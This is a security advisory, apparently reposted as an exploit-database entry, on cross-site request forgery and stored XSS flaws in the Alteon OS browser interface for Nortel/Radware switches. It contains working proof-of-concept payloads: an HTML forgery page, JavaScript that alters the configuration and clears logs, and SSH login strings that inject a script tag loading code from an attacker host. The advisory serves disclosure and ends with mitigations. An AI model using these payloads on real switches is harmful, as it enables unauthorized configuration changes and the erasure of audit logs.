@@ -1,0 +1,188 @@
+# Exploit Title: Alteon OS BBI (Nortell) - Multiple Vulnerabilities
+# Date: 16 Nov 09
+# Author: Sintsov Alexey
+# Software Link: [downoad link if available]
+# Version: <= 21.0.8.3  and may be higher ( <=25.1.0.0 )
+# Tested on: [relevant os]
+# Code : [exploit code]
+
+
+From: DSecRG <research () dsecrg com>
+Date: Mon, 16 Nov 2009 14:01:04 +0300
+
+Digital Security Research Group [DSecRG] Advisory
+http://dsecrg.com/pages/vul/show.php?id=161
+
+Various XSS and XSRF vulnerabilities were identified in the  Alteon OS Browser-Based
+Interface (BBI).
+
+Application:             Alteon OS BBI
+Versions Affected:       <= 21.0.8.3  and may be higher ( <=25.1.0.0 )
+Vendor URL:              http://www.nortelnetworks.com; http://radware.com
+Bug:                     XSS ans XSRF Vulnerabilities
+Exploits:                YES
+Reported:                11.08.2009
+Secondly Reported:       07.09.2009
+Final Reported:          28.10.2009
+Date of Public Advisory: 16.11.2009
+Solution:                YES (Non official)
+Author:                  Sintsov Alexey from Digital Security Research Group [DSecRG]
+
+
+Description
+***********
+
+Browser-Based Interface (BBI) software is included in the Nortel Networks(vesrions < 25.0.0.0) and Radware
+family of  switches. The BBI software lets you use your Web browser to access switch
+information and  statistics, to perform switch configuration via the Internet. This
+vulnerabilities allow remote attackers to change the switch configuration.
+
+
+Details:
+*******
+
+1) XSRF
+
+An attacker may exploit this issue to perform certain administrative actions,
+e.g. change  using predictable URL requests once the user has authenticated and
+obtained a valid session  with the switch.
+
+
+Example
+*******
+
+PoC (Change banner and apply):
+
+<html>
+<head>
+
+<title>Nortel XSRF</title>
+</head>
+<body>
+
+<script src="http://<Switch>/switchSystem.html/bar?banner=newBanner</script>
+<script src="http://<Switch>/TopToolArea.html?actionState=apply"></script>
+
+</body>
+</html>
+
+
+
+2)  Stored XSS
+
+An attacker may inject 36 bytes of JavaScript code into log via SSH login
+parameter.   Login parameter will be written into log as is. BBI or telnet login parameter
+does not write  into log - only SSH. And when log page will be generated all input
+from SSH login parameter will be displayed as is.
+
+Both vulnerabilities give chance to change switch configuration file or attack Administrator's
+workstation. A possibility of  embedding a code into a log without authentication increases
+attacker's chance to succeed.
+
+Also any string parameters in BBI can be used for static XSS.
+
+
+Example
+*******
+
+Crete JavaScript code and put it on evil server (inj.js), this code will
+change switch banner in  current configuration, apply this change and clear log:
+
+Proof of Concept:
+
+
+var request = !window.ActiveXObject ? new XMLHttpRequest() : new
+ActiveXObject("Microsoft.XMLHTTP");
+
+//Change banner
+request.open("GET",
+"http://<NortelSwitch>/switchSystem.html/bar?banner=thx2Kononenko", false);
+request.send(null);
+
+
+request = !window.ActiveXObject ? new XMLHttpRequest() : new
+ActiveXObject("Microsoft.XMLHTTP");
+
+//apply changes
+request.open("GET", "http://<NortelSwitch>/TopToolArea.html?actionState=apply",
+false);
+request.send(null);
+
+request = !window.ActiveXObject ? new XMLHttpRequest() : new
+ActiveXObject("Microsoft.XMLHTTP");
+
+//Clear log
+request.open("GET", "http://<NortelSwitch>/clearLog.html", false);
+request.send(null);
+
+
+Attacker can include this code into log  without use of <EvilHost>.
+But this way faster.
+
+Next step - connect via SSH and inject parts of code.
+
+Exploit:
+
+alexey () shell#:ssh <NortelSwitch>
+
+login as: <script a="
+<script a="@<NortelSwitch>'s password:
+Access denied^C
+
+alexey () shell#:ssh <NortelSwitch>
+
+login as: " src="http://<EvilHost>/inj.js" b="
+" src="http://212.24.49.12/inj.js"; b=" com2="@<NortelSwitch>s password:
+Access denied^C
+
+alexey () shell#:ssh <NortelSwitch>
+
+login as: "></script>
+"></script>@<NortelSwitch>'s password:
+Access denied^C
+
+
+       When administrator have a look into log via BBI, his browser get that:
+
+...
+Jul  3 13:12:44 <NortelSwitch> NOTICE  mgmt: Failed login attempt via SSH from host
+<AttackerHost>, user <script a="<BR>Jul  3 13:13:08 <NortelSwitch> NOTICE  mgmt:
+Failed login attempt via SSH from host <AttackerHost>, user "
+src="http://<EvilHost>/inj.js" b="<BR>Jul  3 13:13:23 <NortelSwitch> NOTICE  mgmt:
+Failed login attempt via SSH from host <AttackerHost>, user "></script><BR>
+
+
+
+Solution:
+*********
+
+We have no answer from Radware about two month. So we don't know about
+this vuln. in versions 25.0.1.0 - 25.1.0.0.
+
+Here are our recommendations:
+
+a) Turn off BBI.
+b) Change default SSHd port.
+
+/c/sys/access/https/https d
+/c/sys/access/http d
+/c/sys/access/sshd/sshport 42
+
+c) Allow access to SSH and BBI only for trusted machines and networks;
+
+References
+**********
+
+http://dsecrg.com/pages/vul/show.php?id=161
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and
+penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI
+DSS standards. Digital Security Research Group focuses on web application and database security problems with
+vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+Contact: research [at] dsecrg [dot] com
+http://www.dsecrg.com
